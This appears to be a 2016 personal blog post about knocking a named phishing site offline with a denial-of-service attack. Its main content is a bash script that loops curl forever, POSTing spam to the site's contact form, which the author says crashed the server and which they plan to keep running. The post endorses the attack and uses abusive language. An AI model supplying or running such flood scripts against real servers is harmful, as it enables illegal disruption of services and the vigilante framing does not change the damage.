---
title:       "DDoS phishing site"
description: "How to DDoS a shitty phishing site run by idiots."
date:        "2016-01-01"
layout:      "post.hbs"
collection:  "blog"
---

[wareztugacontas.com](http://www.wareztugacontas.com/) is a phishing site for the no longer existing wareztuga.tv, which was a Portuguese warez site that streamed movies and TV shows.

If you're so openly running a phishing site, at least put in the effort to avoid being DDoSed so easily. A security question in your form isn't going to stop anyone if the question is always the same, you fucking idiot.

```bash
#! /usr/bin/env bash

while true; do
  curl --data "email=eat_shit_and_die&comments=eat_shit_and_die&verify=4" http://www.wareztugacontas.com/contact.php
done
```

This is a very basic classic HTTP flood attack in bash that will POST to the server forever. If you can't protect yourself from something that could have been avoided so easily, you're kind of stupid.

I launched a few instances of the script on my laptop and the server at [wareztugacontas.com](http://www.wareztugacontas.com/) choked in less than a minute. I'm gonna keep doing it just for fun.

Karma is a bitch, huh?
